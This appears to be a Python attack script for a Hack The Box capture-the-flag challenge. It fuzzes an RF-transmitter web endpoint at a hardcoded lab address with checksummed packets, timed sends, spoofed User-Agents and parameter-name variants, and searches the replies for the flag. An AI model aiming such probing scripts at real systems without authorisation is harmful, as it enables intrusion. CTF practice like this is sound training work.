#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 114: Timing attack - enviar a intervalos muy precisos
print("[*] INNOVACIÓN 114: Precise timing (100ms intervals)")
s = requests.Session()
s.get(base_url)

start_time = time.time()
for i, (addr, cmd) in enumerate([(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]):
    # Esperar hasta el intervalo exacto
    target_time = start_time + (i * 0.1)
    time.sleep(max(0, target_time - time.time()))
    
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    print(f"  [{time.time() - start_time:.3f}s] Sent to {addr:02X}")

time.sleep(3)
r = s.get(base_url)
if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 115: Probar diferentes User-Agent específicos de RF
print("\n[*] INNOVACIÓN 115: RF-specific User-Agents")
rf_agents = [
    'SDR/1.0',
    'GNURadio/3.8',
    'HackRF/2021',
    'RTL-SDR/0.6',
    'Omega/1.0',
]

for agent in rf_agents:
    s = requests.Session()
    s.headers['User-Agent'] = agent
    r = s.get(base_url)
    
    data = bytes([0xE1, 0xFF])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    
    time.sleep(1)
    r = s.get(base_url)
    if 'HTB{' in r.text:
        print(f"[SUCCESS with {agent}]", re.findall(r'HTB\{[^}]+\}', r.text))
        break

# INNOVACIÓN 116: Case variations
print("\n[*] INNOVACIÓN 116: Case variations in parameters")
s = requests.Session()
s.get(base_url)

case_variants = [
    {'FREQ': '433.92', 'MOD': 'ASK', 'BITS': '1', 'MSG': 'E1FF217D'},
    {'Freq': '433.92', 'Mod': 'ASK', 'Bits': '1', 'Msg': 'E1FF217D'},
    {'frequency': '433.92', 'modulation': 'ASK', 'bits': '1', 'message': 'E1FF217D'},
]

for variant in case_variants:
    r = s.post(f'{base_url}/transmit', data=variant)
    if r.status_code != 400:
        print(f"[+] Accepted: {variant}")
        if 'HTB{' in r.text:
            print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

print("\n[*] Innovaciones 114-116 completadas")
